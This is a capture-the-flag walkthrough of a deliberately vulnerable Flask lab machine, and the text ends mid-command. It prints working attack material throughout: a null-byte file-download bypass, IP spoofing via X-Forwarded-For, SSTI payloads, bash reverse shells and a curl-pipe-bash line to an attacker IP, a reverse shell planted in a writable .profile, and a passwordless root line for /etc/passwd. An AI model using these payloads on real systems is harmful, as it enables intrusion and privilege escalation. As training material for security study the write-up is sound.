---
created: 2026-03-13
modified: 2026-03-13
---

This is a linux based challenge.

Challenge description.

```
Well, Well, Well, you're here, and I am glad to see that! Your task is simple.. well, not really.. I mean, it's kind of.. but.. anyways...  
I was debugging my work and forgot about some _probably_ harmful code, and sadly, I lost access to my machine. :(

Could you find my valuable information for me?  
Don't forget to enjoy the journey while at it.
```

Port scan we get this.

```bash
sudo nmap -Pn -sCV -p- --min-rate 2500 -T3 -oN 10.10.102.17-port-scan 10.10.102.17         
[sudo] password for darklight: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-19 11:45 EAT
Nmap scan report for 10.10.102.17
Host is up (0.17s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3e:b8:18:ef:45:a8:df:59:bf:11:49:4b:1d:b6:b8:93 (RSA)
|   256 0b:cf:f9:94:06:85:97:f6:bd:cc:33:66:4e:26:ea:27 (ECDSA)
|_  256 60:ce:be:2d:1e:f0:18:00:30:70:ff:a2:66:d7:85:f7 (ED25519)
7777/tcp open  http    Werkzeug httpd 2.3.4 (Python 3.11.0)
|_http-title: Super Secret TIp
|_http-server-header: Werkzeug/2.3.4 Python/3.11.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.11 seconds
```

We are interacting with `Werkzeug/2.3.4`
Werkzeug is a **Python library that provides WSGI utilities for building web applications**, handling the low-level details of HTTP requests, responses, and routing. It serves as the core on which frameworks like Flask are built, offering tools for request parsing, response generation, debugging, and development servers.

The main security risks come from **misconfiguration** (especially leaving the interactive debugger enabled) 

the most common path to test are the `/console` 


visiting the page i get this 
![[Pasted_image_20250919121056.png]]

but the /console is not available 

![[Pasted_image_20250919121136.png]]

Anyway to learn how to exploit this path checkout [this](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html)

## Directory Enumeration

i identified this paths

```bash
cloud                   [Status: 200, Size: 2991, Words: 904, Lines: 80, 
debug                   [Status: 200, Size: 1957, Words: 672, Lines: 69, 
```

at /debug we have this 

![[Pasted_image_20250919121530.png]]

we need a password to access it's functionality

at /cloud 

![[Pasted_image_20250919121814.png]]

the passwords and secret files gave me the error below but the other files were downloadable.

![[Pasted_image_20250919121732.png]]

### Analyzing the files

```bash
└─$ file MyApp.apk                                                  
MyApp.apk: ASCII text, with no line terminators

┌──(darklight㉿jinx)-[~/Documents/ctf/thm/superSecretTip]
└─$ cat MyApp.apk                 
(7> !(=H =*                                                                                
┌──(darklight㉿jinx)-[~/Documents/ctf/thm/superSecretTip]
└─$ cat templates.py        
from flask import *
import hashlib
import os
```

tried using the text from the apk file as the password in `/debug` but it didnt work.


#### Analyzing the video file.

Trying to play the video i just get this.

![[Pasted_image_20250919124310.png]]

nothing is playing. Checking the file type i get this.

```
file VID_0022.MOV           
VID_0022.MOV: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 232x217, components 3
```

Its not a .MOV file but a JPEG file. i wll rename the file to this.

```bash
mv VID_0022.MOV hidden.jpg  
```

running string against the jpg file i get nothing but the first line just confirms that it is a jpg file

```bash
strings hidden.jpg                                                                
JFIF
!1!%*+...
383,7(-.+
%----++--/-+----+--7------.----------------0-------
!1AQ
23Rs

[SNIP]
```

feels like we are on someting with this 

```bash
steghide info hidden.jpg

"hidden.jpg":
  format: jpeg
  capacity: 322.0 Byte
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

Unfortunately steegseek reveals to us that there is no hidden data in the jpg file 

```bash
stegseek --seed hidden.jpg                                       
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Progress: 99.99% (4294635000 seeds)           
[!] error: Could not find a valid seed.
```

Analyzing the other file i find nothing beside knowing it is a webp file 

```bash
exiftool IMG_1425.NEF                                    
ExifTool Version Number         : 13.25
File Name                       : IMG_1425.NEF
Directory                       : .
File Size                       : 41 kB
File Modification Date/Time     : 2025:09:19 12:20:00+03:00
File Access Date/Time           : 2025:09:19 12:20:28+03:00
File Inode Change Date/Time     : 2025:09:19 12:20:27+03:00
File Permissions                : -rw-rw-r--
File Type                       : WEBP
File Type Extension             : webp
MIME Type                       : image/webp
VP8 Version                     : 0 (bicubic reconstruction, normal loop)
Image Width                     : 621
Horizontal Scale                : 0
Image Height                    : 414
Vertical Scale                  : 0
Image Size                      : 621x414
Megapixels                      : 0.257
```

### Web exploitaion

analyzing the download request

```
POST /cloud HTTP/1.1
Host: 10.10.102.17:7777
Content-Length: 28
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.10.102.17:7777
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.102.17:7777/cloud
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

download=MyApp.apk&download=
```

Attempting LFI exploitation didnt get me anywhere. I tried multiple payloads but didnt work.

i decided to run a simple bruteforce on the `/debug` path using ffuf.

As the bruteforce is running i got back to the download feature. Here is the thought, if the files we are sownloading are in the same folder as the web files we can download the files unless the web application has a security mechanism against that.

I told chat to generate a list of possible python files that can be in a flask project since we know that th application is running on flask, and i got this list 

```
config.py
settings.py
local_settings.py
production_settings.py
development_settings.py
test_settings.py
secrets.py
env.py
environment.py
constants.py
credentials.py
keys.py
secrets_manager.py
database.py
db.py
app.py
models.py
migrations.py
alembic.py
seeds.py
fixtures.py
auth.py
authentication.py
authorization.py
security.py
permissions.py
tokens.py
jwt.py
oauth.py
users.py
accounts.py
sessions.py
session.py
storage.py
uploads.py
files.py
s3.py
bucket.py
email.py
mailer.py
notifier.py
integrations.py
thirdparty.py
external.py
payments.py
billing.py
invoice.py
debug.py
debugger.py
source.py
manage.py
cli.py
run.py
wsgi.py
docker_entrypoint.py
backup.py
restore.py
logging.py
logger.py
```

After saving the the file names to a file i forwarded the download request to intruder and loaded my file list

![[Pasted_image_20250920103024.png]]

`source.py` returns a `200` status code meaning the file is valid.

![[Pasted_image_20250920103442.png]]

forwarded the request to repeater and send again 

![[Pasted_image_20250920103606.png]]

And we have some code :)

```python
from flask import *
import hashlib
import os
import ip # from .
import debugpassword # from .
import pwn

app = Flask(__name__)
app.secret_key = os.urandom(32)
password = str(open('supersecrettip.txt').readline().strip())

def illegal_chars_check(input):
    illegal = "'&;%"
    error = ""
    if any(char in illegal for char in input):
        error = "Illegal characters found!"
        return True, error
    else:
        return False, error

@app.route("/cloud", methods=["GET", "POST"]) 
def download():
    if request.method == "GET":
        return render_template('cloud.html')
    else:
        download = request.form['download']
        if download == 'source.py':
            return send_file('./source.py', as_attachment=True)
        if download[-4:] == '.txt':
            print('download: ' + download)
            return send_from_directory(app.root_path, download, as_attachment=True)
        else:
            return send_from_directory(app.root_path + "/cloud", download, as_attachment=True)
            # return render_template('cloud.html', msg="Network error occurred")

@app.route("/debug", methods=["GET"]) 
def debug():
    debug = request.args.get('debug')
    user_password = request.args.get('password')
    
    if not user_password or not debug:
        return render_template("debug.html")
    result, error = illegal_chars_check(debug)
    if result is True:
        return render_template("debug.html", error=error)

    # I am not very eXperienced with encryptiOns, so heRe you go!
    encrypted_pass = str(debugpassword.get_encrypted(user_password))
    if encrypted_pass != password:
        return render_template("debug.html", error="Wrong password.")
    
    
    session['debug'] = debug
    session['password'] = encrypted_pass
        
    return render_template("debug.html", result="Debug statement executed.")

@app.route("/debugresult", methods=["GET"]) 
def debugResult():
    if not ip.checkIP(request):
        return abort(401, "Everything made in home, we don't like intruders.")
    
    if not session:
        return render_template("debugresult.html")
    
    debug = session.get('debug')
    result, error = illegal_chars_check(debug)
    if result is True:
        return render_template("debugresult.html", error=error)
    user_password = session.get('password')
    
    if not debug and not user_password:
        return render_template("debugresult.html")
        
    # return render_template("debugresult.html", debug=debug, success=True)
    
    # TESTING -- DON'T FORGET TO REMOVE FOR SECURITY REASONS
    template = open('./templates/debugresult.html').read()
    return render_template_string(template.replace('DEBUG_HERE', debug), success=True, error="")

@app.route("/", methods=["GET"])
def index():
    return render_template('index.html')

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=7777, debug=False)
```

what we see first is that there are other code files in the same directory where `source.py` is located 

```python
import ip # from .
import debugpassword # from .
```

Looking closely at the download function, there are some rules for downloading files. First it is direct to us that we have the persmission to download `source.py`. Second for any file that is not `source.py` has to end with `.txt` extension in order for it to be downloaded.  This line extract the last 4 digits to the file we want to download `download[-4:] == '.txt'`

```python
download = request.form['download']
if download == 'source.py':
    return send_file('./source.py', as_attachment=True)
if download[-4:] == '.txt':
    print('download: ' + download)
    return send_from_directory(app.root_path, download, as_attachment=True)
```

We can try to bypass this by using the null byte, `\x00` so that we can download the `debugpassword.py` and `ip.py` files.

Taking a look at the `debug` function we see that we must supply a value to the debug and password parameters. Analyzing the password check... 

```python
# I am not very eXperienced with encryptiOns, so heRe you go!
encrypted_pass = str(debugpassword.get_encrypted(user_password))
if encrypted_pass != password:
	return render_template("debug.html", error="Wrong password.")
```

From the comment the uppercase letters point to `XOR` bitwiise operation.  This line takes the supplied password and performs an XOR operation, then converts the results to a string `str(debugpassword.get_encrypted(user_password))`  and save it to the variable `encrypted_pass` which is later compared to the value of the variable `password`

Luckily we know what the value of password is or rather we can find out easily what the value of password is 

```python
password = str(open('supersecrettip.txt').readline().strip())
```

and we get some bytes 

![[Pasted_image_20250920110136.png]]

```
b' \x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e'
```

One thing about XOR is that it is reversible and we are going to use this to our advantage in order to get the password. To retrive the XOR key we need to get access to `debugpassword.py`

Make sure to url encode the null byte `\x00`, it's url-encoded form is `%00`

![[Pasted_image_20250920112420.png]]

```python
import pwn

def get_encrypted(passwd):
    return pwn.xor(bytes(passwd, 'utf-8'), b'ayham')
```

and we have the key `ayham`

first lest create a virtual environment and install `pwntools`

```bash
┌──(darklight㉿jinx)-[~/Documents/ctf/thm/superSecretTip]
└─$ python3 -m venv .venv          

┌──(darklight㉿jinx)-[~/Documents/ctf/thm/superSecretTip]
└─$ source .venv/bin/activate

┌──(.venv)─(darklight㉿jinx)-[~/Documents/ctf/thm/superSecretTip]
└─$ pip install pwntools           
Collecting pwntools
  Downloading pwntools-4.14.1-py2.py3-none-any.whl.metadata (5.3 kB)
Collecting paramiko>=1.15.2 (from pwntools)
```

```python
┌──(.venv)─(darklight㉿jinx)-[~/Documents/ctf/thm/superSecretTip]
└─$ python3              
Python 3.13.6 (main, Aug  7 2025, 10:53:54) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import pwn
>>> encrypted_password = b' \x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e'
>>> key = b'ayham'
>>> print(pwn.xor(encrypted_password, key).decode("utf-8"))
AyhamDeebugg
>>> 
```

And we get the password.

And is valid

![[Pasted_image_20250920114208.png]]

At `/debug` the first input field has the placeholder `1337 * 1337`, this is SSTI.

The results are being displayed at `/debugresult` path 

```python
def debugResult():
    if not ip.checkIP(request):
        return abort(401, "Everything made in home, we don't like intruders.")
    
    if not session:
        return render_template("debugresult.html")
    
    debug = session.get('debug')
    result, error = illegal_chars_check(debug)
    if result is True:
        return render_template("debugresult.html", error=error)
    user_password = session.get('password')
    
    if not debug and not user_password:
        return render_template("debugresult.html")
        
    # return render_template("debugresult.html", debug=debug, success=True)
    
    # TESTING -- DON'T FORGET TO REMOVE FOR SECURITY REASONS
    template = open('./templates/debugresult.html').read()
    return render_template_string(template.replace('DEBUG_HERE', debug), success=True, error="")
```
Based on the code above we know if we dont pass the ip check then we wont have access to the page. By default we dont have access

![[Pasted_image_20250920115202.png]]

![[Pasted_image_20250920115221.png]]

```python
host_ip = "127.0.0.1"
def checkIP(req):
    try:
        return req.headers.getlist("X-Forwarded-For")[0] == host_ip
    except:
        return req.remote_addr == host_ip
```

We need to add this to our headers 
```
X-Forwarded-For : 127.0.0.1
```

![[Pasted_image_20250920115520.png]]

![[Pasted_image_20250920115602.png]]

Based on the result it does not seem like `1337 * 1337` was executed.

making the payload right, `{{1337 * 1337}}`

```
GET /debug?debug={{1337+*+1337}}&password=AyhamDeebugg HTTP/1.1
Host: 10.10.56.111:7777
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.56.111:7777/debug
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

you will notice with every request at `/debug` we get a unique session cookie, so make sure you update the session cookie when making request to `/debigresults` in order to view the results of the right payload.

This time our expression is evaluated.

![[Pasted_image_20250920121439.png]]

#### Exploiting SSTI
The goal is to exploit this vulnerability to get a reverse shell. You can locate various SSTI payload [here](https://github.com/payloadbox/ssti-payloads)

Dont forget the application filters illegal characters passed to `debug` parameter

```python
def illegal_chars_check(input):
    illegal = "'&;%"
    error = ""
    if any(char in illegal for char in input):
        error = "Illegal characters found!"
        return True, error
    else:
        return False, error
```

Using this payload i was able to execute system command 

```python
{{config.__class__.__init__.__globals__["os"].popen("ls").read()}}
```

![[Pasted_image_20250920123136.png]]

This is the most basic way to bypass the checks since all the revshell command have the "illegal character" but unfortunately it didn't not seem to work.
```python
{{config.__class__.__init__.__globals__["os"].popen("bash -c "curl http://10.21.65.152:8000/rev.sh | bash"").read()}}
```

We are only getting a hit at our server but no connection at the listener.

```bash
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.56.111 - - [20/Sep/2025 12:35:42] "GET /rev.sh HTTP/1.1" 200 -
```
querying  the builtins so we know what functions we have access to.

```python
{{config.__class__.__init__.__globals__["__builtins__"]}}
```

```
 class="result">{&#39;__name__&#39;: &#39;builtins&#39;, &#39;__doc__&#39;: &#34;Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil&#39; object; Ellipsis represents `...&#39; in slices.&#34;, &#39;__package__&#39;: &#39;&#39;, &#39;__loader__&#39;: &lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;, &#39;__spec__&#39;: ModuleSpec(name=&#39;builtins&#39;, loader=&lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;, origin=&#39;built-in&#39;), &#39;__build_class__&#39;: &lt;built-in function __build_class__&gt;, &#39;__import__&#39;: &lt;built-in function __import__&gt;, &#39;abs&#39;: &lt;built-in function abs&gt;, &#39;all&#39;: &lt;built-in function all&gt;, &#39;any&#39;: &lt;built-in function any&gt;, &#39;ascii&#39;: &lt;built-in function ascii&gt;, &#39;bin&#39;: &lt;built-in function bin&gt;, &#39;breakpoint&#39;: &lt;built-in function breakpoint&gt;, &#39;callable&#39;: &lt;built-in function callable&gt;, &#39;chr&#39;: &lt;built-in function chr&gt;, &#39;compile&#39;: &lt;built-in function compile&gt;, &#39;delattr&#39;: &lt;built-in function delattr&gt;, &#39;dir&#39;: &lt;built-in function dir&gt;, &#39;divmod&#39;: &lt;built-in function divmod&gt;, &#39;eval&#39;: &lt;built-in function eval&gt;, &#39;exec&#39;: &lt;built-in function exec&gt;, &#39;format&#39;: &lt;built-in function format&gt;, &#39;getattr&#39;: &lt;built-in function getattr&gt;, &#39;globals&#39;: &lt;built-in function globals&gt;, &#39;hasattr&#39;: &lt;built-in function hasattr&gt;, &#39;hash&#39;: &lt;built-in function hash&gt;, &#39;hex&#39;: &lt;function hex at 0x7fc2e9b10f40&gt;, &#39;id&#39;: &lt;built-in function id&gt;, &#39;input&#39;: &lt;built-in function input&gt;, &#39;isinstance&#39;: &lt;built-in function isinstance&gt;, &#39;issubclass&#39;: &lt;built-in function issubclass&gt;, &#39;iter&#39;: &lt;built-in function iter&gt;, &#39;aiter&#39;: &lt;built-in function aiter&gt;, &#39;len&#39;: &lt;built-in function len&gt;, &#39;locals&#39;: &lt;built-in function locals&gt;, &#39;max&#39;: &lt;built-in function max&gt;, &#39;min&#39;: &lt;built-in function min&gt;, &#39;next&#39;: &lt;built-in function next&gt;, &#39;anext&#39;: &lt;built-in function anext&gt;, &#39;oct&#39;: &lt;built-in function oct&gt;, &#39;ord&#39;: &lt;built-in function ord&gt;, &#39;pow&#39;: &lt;built-in function pow&gt;, &#39;print&#39;: &lt;built-in function print&gt;, &#39;repr&#39;: &lt;built-in function repr&gt;, &#39;round&#39;: &lt;built-in function round&gt;, &#39;setattr&#39;: &lt;built-in function setattr&gt;, &#39;sorted&#39;: &lt;built-in function sorted&gt;, &#39;sum&#39;: &lt;built-in function sum&gt;, &#39;vars&#39;: &lt;built-in function vars&gt;, &#39;None&#39;: None, &#39;Ellipsis&#39;: Ellipsis, &#39;NotImplemented&#39;: NotImplemented, &#39;False&#39;: False, &#39;True&#39;: True, &#39;bool&#39;: &lt;class &#39;bool&#39;&gt;, &#39;memoryview&#39;: &lt;class &#39;memoryview&#39;&gt;, &#39;bytearray&#39;: &lt;class &#39;bytearray&#39;&gt;, &#39;bytes&#39;: &lt;class &#39;bytes&#39;&gt;, &#39;classmethod&#39;: &lt;class &#39;classmethod&#39;&gt;, &#39;complex&#39;: &lt;class &#39;complex&#39;&gt;, &#39;dict&#39;: &lt;class &#39;dict&#39;&gt;, &#39;enumerate&#39;: &lt;class &#39;enumerate&#39;&gt;, &#39;filter&#39;: &lt;class &#39;filter&#39;&gt;, &#39;float&#39;: &lt;class &#39;float&#39;&gt;, &#39;frozenset&#39;: &lt;class &#39;frozenset&#39;&gt;, &#39;property&#39;: &lt;class &#39;property&#39;&gt;, &#39;int&#39;: &lt;class &#39;int&#39;&gt;, &#39;list&#39;: &lt;class &#39;list&#39;&gt;, &#39;map&#39;: &lt;class &#39;map&#39;&gt;, &#39;object&#39;: &lt;class &#39;object&#39;&gt;, &#39;range&#39;: &lt;class &#39;range&#39;&gt;, &#39;reversed&#39;: &lt;class &#39;reversed&#39;&gt;, &#39;set&#39;: &lt;class &#39;set&#39;&gt;, &#39;slice&#39;: &lt;class &#39;slice&#39;&gt;, &#39;staticmethod&#39;: &lt;class &#39;staticmethod&#39;&gt;, &#39;str&#39;: &lt;class &#39;str&#39;&gt;, &#39;super&#39;: &lt;class &#39;super&#39;&gt;, &#39;tuple&#39;: &lt;class &#39;tuple&#39;&gt;, &#39;type&#39;: &lt;class &#39;type&#39;&gt;, &#39;zip&#39;: &lt;class &#39;zip&#39;&gt;, &#39;__debug__&#39;: True, &#39;BaseException&#39;: &lt;class &#39;BaseException&#39;&gt;, &#39;BaseExceptionGroup&#39;: &lt;class &#39;BaseExceptionGroup&#39;&gt;, &#39;Exception&#39;: &lt;class &#39;Exception&#39;&gt;, &#39;GeneratorExit&#39;: &lt;class &#39;GeneratorExit&#39;&gt;, &#39;KeyboardInterrupt&#39;: &lt;class &#39;KeyboardInterrupt&#39;&gt;, &#39;SystemExit&#39;: &lt;class &#39;SystemExit&#39;&gt;, &#39;ArithmeticError&#39;: &lt;class &#39;ArithmeticError&#39;&gt;, &#39;AssertionError&#39;: &lt;class &#39;AssertionError&#39;&gt;, &#39;AttributeError&#39;: &lt;class &#39;AttributeError&#39;&gt;, &#39;BufferError&#39;: &lt;class &#39;BufferError&#39;&gt;, &#39;EOFError&#39;: &lt;class &#39;EOFError&#39;&gt;, &#39;ImportError&#39;: &lt;class &#39;ImportError&#39;&gt;, &#39;LookupError&#39;: &lt;class &#39;LookupError&#39;&gt;, &#39;MemoryError&#39;: &lt;class &#39;MemoryError&#39;&gt;, &#39;NameError&#39;: &lt;class &#39;NameError&#39;&gt;, &#39;OSError&#39;: &lt;class &#39;OSError&#39;&gt;, &#39;ReferenceError&#39;: &lt;class &#39;ReferenceError&#39;&gt;, &#39;RuntimeError&#39;: &lt;class &#39;RuntimeError&#39;&gt;, &#39;StopAsyncIteration&#39;: &lt;class &#39;StopAsyncIteration&#39;&gt;, &#39;StopIteration&#39;: &lt;class &#39;StopIteration&#39;&gt;, &#39;SyntaxError&#39;: &lt;class &#39;SyntaxError&#39;&gt;, &#39;SystemError&#39;: &lt;class &#39;SystemError&#39;&gt;, &#39;TypeError&#39;: &lt;class &#39;TypeError&#39;&gt;, &#39;ValueError&#39;: &lt;class &#39;ValueError&#39;&gt;, &#39;Warning&#39;: &lt;class &#39;Warning&#39;&gt;, &#39;FloatingPointError&#39;: &lt;class &#39;FloatingPointError&#39;&gt;, &#39;OverflowError&#39;: &lt;class &#39;OverflowError&#39;&gt;, &#39;ZeroDivisionError&#39;: &lt;class &#39;ZeroDivisionError&#39;&gt;, &#39;BytesWarning&#39;: &lt;class &#39;BytesWarning&#39;&gt;, &#39;DeprecationWarning&#39;: &lt;class &#39;DeprecationWarning&#39;&gt;, &#39;EncodingWarning&#39;: &lt;class &#39;EncodingWarning&#39;&gt;, &#39;FutureWarning&#39;: &lt;class &#39;FutureWarning&#39;&gt;, &#39;ImportWarning&#39;: &lt;class &#39;ImportWarning&#39;&gt;, &#39;PendingDeprecationWarning&#39;: &lt;class &#39;PendingDeprecationWarning&#39;&gt;, &#39;ResourceWarning&#39;: &lt;class &#39;ResourceWarning&#39;&gt;, &#39;RuntimeWarning&#39;: &lt;class &#39;RuntimeWarning&#39;&gt;, &#39;SyntaxWarning&#39;: &lt;class &#39;SyntaxWarning&#39;&gt;, &#39;UnicodeWarning&#39;: &lt;class &#39;UnicodeWarning&#39;&gt;, &#39;UserWarning&#39;: &lt;class &#39;UserWarning&#39;&gt;, &#39;BlockingIOError&#39;: &lt;class &#39;BlockingIOError&#39;&gt;, &#39;ChildProcessError&#39;: &lt;class &#39;ChildProcessError&#39;&gt;, &#39;ConnectionError&#39;: &lt;class &#39;ConnectionError&#39;&gt;, &#39;FileExistsError&#39;: &lt;class &#39;FileExistsError&#39;&gt;, &#39;FileNotFoundError&#39;: &lt;class &#39;FileNotFoundError&#39;&gt;, &#39;InterruptedError&#39;: &lt;class &#39;InterruptedError&#39;&gt;, &#39;IsADirectoryError&#39;: &lt;class &#39;IsADirectoryError&#39;&gt;, &#39;NotADirectoryError&#39;: &lt;class &#39;NotADirectoryError&#39;&gt;, &#39;PermissionError&#39;: &lt;class &#39;PermissionError&#39;&gt;, &#39;ProcessLookupError&#39;: &lt;class &#39;ProcessLookupError&#39;&gt;, &#39;TimeoutError&#39;: &lt;class &#39;TimeoutError&#39;&gt;, &#39;IndentationError&#39;: &lt;class &#39;IndentationError&#39;&gt;, &#39;IndexError&#39;: &lt;class &#39;IndexError&#39;&gt;, &#39;KeyError&#39;: &lt;class &#39;KeyError&#39;&gt;, &#39;ModuleNotFoundError&#39;: &lt;class &#39;ModuleNotFoundError&#39;&gt;, &#39;NotImplementedError&#39;: &lt;class &#39;NotImplementedError&#39;&gt;, &#39;RecursionError&#39;: &lt;class &#39;RecursionError&#39;&gt;, &#39;UnboundLocalError&#39;: &lt;class &#39;UnboundLocalError&#39;&gt;, &#39;UnicodeError&#39;: &lt;class &#39;UnicodeError&#39;&gt;, &#39;BrokenPipeError&#39;: &lt;class &#39;BrokenPipeError&#39;&gt;, &#39;ConnectionAbortedError&#39;: &lt;class &#39;ConnectionAbortedError&#39;&gt;, &#39;ConnectionRefusedError&#39;: &lt;class &#39;ConnectionRefusedError&#39;&gt;, &#39;ConnectionResetError&#39;: &lt;class &#39;ConnectionResetError&#39;&gt;, &#39;TabError&#39;: &lt;class &#39;TabError&#39;&gt;, &#39;UnicodeDecodeError&#39;: &lt;class &#39;UnicodeDecodeError&#39;&gt;, &#39;UnicodeEncodeError&#39;: &lt;class &#39;UnicodeEncodeError&#39;&gt;, &#39;UnicodeTranslateError&#39;: &lt;class &#39;UnicodeTranslateError&#39;&gt;, &#39;ExceptionGroup&#39;: &lt;class &#39;ExceptionGroup&#39;&gt;, &#39;EnvironmentError&#39;: &lt;class &#39;OSError&#39;&gt;, &#39;IOError&#39;: &lt;class &#39;OSError&#39;&gt;, &#39;open&#39;: &lt;built-in function open&gt;, &#39;quit&#39;: Use quit() or Ctrl-D (i.e. EOF) to exit, &#39;exit&#39;: Use exit() or Ctrl-D (i.e. EOF) to 
```

Anlyzing the output we notice we have the `chr` function

```
 &#39;chr&#39;: &lt;built-in function chr&gt;
```

We can construct the command string by converting each illegal character to its ASCII code and then using `chr` to get it back.

`/bin/bash -i >& /dev/tcp/10.21.65.152/1337 0>&1` is the revshell command we want to execute

we can convert the illegal character `&` using `config.__class__.__init__.__globals__["__builtins__"]["chr"](38)`

now the final payload becomes 

```
{{config.__class__.__init__.__globals__["os"].popen("bash -c \"bash -i >" + config.__class__.__init__.__globals__["__builtins__"]["chr"](38) + " /dev/tcp/10.21.65.152/1337 0>" + config.__class__.__init__.__globals__["__builtins__"]["chr"](38) + "1\"")}}
```

After executing this take the cookie you receive in the response and use it in the /debugresults in order to execute the payload.

and we get a connection at our listener 

```bash
rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.21.65.152] from (UNKNOWN) [10.10.56.111] 46702
bash: cannot set terminal process group (14): Inappropriate ioctl for device
bash: no job control in this shell
ayham@482cbf2305ae:/app$ whoami
whoami
ayham
ayham@482cbf2305ae:/app$ 
```

First flag is at `/home/ayham/`

In the root directory we get this.

```bash
cat /secret-tip.txt
A wise *gpt* once said ...
In the depths of a hidden vault, the mastermind discovered that vital ▒▒▒▒▒ of their secret ▒▒▒▒▒▒ had vanished without a trace. They knew their ▒▒▒▒▒▒▒ was now vulnerable to disruption, setting in motion a desperate race against time to recover the missing ▒▒▒▒▒▒ before their ▒▒▒▒▒▒▒ unraveled before their eyes.
So, I was missing 2 .. hmm .. what were they called? ... I actually forgot, anyways I need to remember them, they're important. The past/back/before/not after actually matters, follow it!
Don't forget it's always about root!
```

some kind of riddle.. i think.. Anyways looking at the crontab i get this 

```bash
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
*  *    * * *   root    curl -K /home/F30s/site_check
*  *    * * *   F30s    bash -lc 'cat /home/F30s/health_check'
```

```bash
ayham@482cbf2305ae:/tmp$ cat /home/F30s/health_check
cat /home/F30s/health_check
Health: 1337/100
ayham@482cbf2305ae:/tmp$ file /home/F30s/site_check
file /home/F30s/site_check
/home/F30s/site_check: regular file, no read permission
```

Taking a closer look, the bash command has a flag `-l`

```bash
bash -lc 'cat /home/F30s/health_check'
```

> [!Info]
> The `bash -l` command invokes the Bash shell as a login shell, which means it reads and ==executes== initialization files such as `/etc/profile`, `~/.bash_profile`, `~/.bash_login`, or `~/.profile` to set up the environment. This is typically used to ensure a full environment setup, similar to what occurs when a user logs in directly.

Looking at the permission we have on the files listed above i get this.

```bash
ls -al /home/F30s/.profile
-rw-r--rw- 1 F30s F30s 807 Mar 27  2022 /home/F30s/.profile
```

We have write permissions on '.profile' file of `F30s`

we can just add a rev script to the file and wait for the crontab to execute

```bash
ayham@482cbf2305ae:/home/F30s$ echo '/bin/bash -i >& /dev/tcp/10.21.65.152/4444 0>&1' >> .profile 
```

After a few seconds i get a connection as `F30sto my listener.

```bash
rlwrap nc -lvnp 4444     
listening on [any] 4444 ...
connect to [10.21.65.152] from (UNKNOWN) [10.10.50.184] 47856
bash: cannot set terminal process group (12803): Inappropriate ioctl for device
bash: no job control in this shell
F30s@482cbf2305ae:~$ whoami
whoami
F30s
F30s@482cbf2305ae:~$ 
```

Now we have permission sto read the other file.

```bash
F30s@482cbf2305ae:~$ cat site_check
cat site_check
url = "http://127.0.0.1/health_check"
```

we only have an url in the file. Looking on how the file is used 

```bash
curl -K /home/F30s/site_check
```

> [!Info]
> The -K (uppercase) flag means --config. It is used to read curl options from a configuration file

Since we have write permissions to the file we can define how curl behaves including adding output files.

Am going to try to access `/etc/passwd` and save it to a file.

```
url = "http://127.0.0.1/etc/paswd"
output = "/tmp/passwd"
```

i waited and the file was not created in `/tmp`

Changing the url to  point to my python server 

```
url = "http://10.21.65.152:8000/test.txt"
output = "/tmp/test.txt"
```

```bash
┌──(darklight㉿jinx)-[~/Documents/tools]
└─$ echo 'hello there' > test.txt                                                                   
┌──(darklight㉿jinx)-[~/Documents/tools]
└─$ python3 -m http.server                  
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

after sometime we get a call at the server and the file is save in `/tmp`

```bash
F30s@482cbf2305ae:~$ ls /tmp
ls /tmp
f
lin.sh
test.txt
F30s@482cbf2305ae:~$ cat /tmp/test.txt
cat /tmp/test.txt
hello there
```

next we are going to creat a nre user with root privileges. to under the format of `/etc/passwd` file check this out, https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/

To keep teh original `/etc/passwd` file of our target copy the file our attack machine.Then to the copied file in our attacker machine we append this :

```
hacker::0:0:hacker:/home/hacker:/bin/bash
```

this will add the user `hacker` with root privileges to the system.

```bash
┌──(darklight㉿jinx)-[~/Documents/ctf/thm/superSecretTip]
